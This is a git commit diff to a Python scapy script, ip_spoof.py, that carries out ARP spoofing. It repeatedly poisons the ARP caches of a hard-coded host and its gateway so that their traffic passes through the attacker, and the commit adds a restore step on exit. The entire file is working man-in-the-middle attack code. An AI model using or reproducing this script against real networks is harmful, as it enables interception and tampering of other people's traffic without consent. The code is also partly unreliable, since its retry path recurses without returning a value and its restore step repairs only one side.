edc0de9ba6456e972b5e96fdb17fd6bdfa64ef55
dashzou <fxfddfno@gmail.com>
2020-07-01 07:47:10 -0400

    restore old connection :P

--- ip_spoof.py
+++ ip_spoof.py
@@ -2,6 +2,7 @@
 import scapy.all as scapy
 import time
 
+
 def get_mac(ip):
     # send packet
     arp_request = scapy.ARP(pdst=ip)
@@ -11,23 +12,34 @@ def get_mac(ip):
 
     # srp send and get response to get mac_target
     answared = scapy.srp(arp_request_boradcast, timeout=10, verbose=False)[0]
-    #print(answared)
-    #print(answared[0][1].hwsrc)
-    return answared[0][1].hwsrc
+    try:
+        return answared[0][1].hwsrc
+    except:
+        get_mac(ip)
 
-# packet ready to send it.
+
 def spoof(target_ip, spoof_ip):
-	target_mac = get_mac(target_ip)
-	#print(target_mac)
-	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-	#print(packet.summary())
-	#print(packet.show())
-	scapy.send(packet, verbose=False)
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
 
 sent_packets_count = 0
-while True:
-	spoof("192.168.1.115", "192.168.1.1")
-	spoof("192.168.1.1", "192.168.1.115")
-	sent_packets_count = sent_packets_count + 2
-	print(f"\r[+] Send {str(sent_packets_count)} packets", end="")
-	time.sleep(2)
+try:
+    while True:
+        spoof("192.168.1.115", "192.168.1.1")
+        spoof("192.168.1.1", "192.168.1.115")
+        sent_packets_count = sent_packets_count + 2
+        print(f"\r[+] Send {str(sent_packets_count)} packets", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\r[+] Delected CATRL + C... Quitting\n", end="")
+    restore("192.168.1.115", "192.168.1.1")
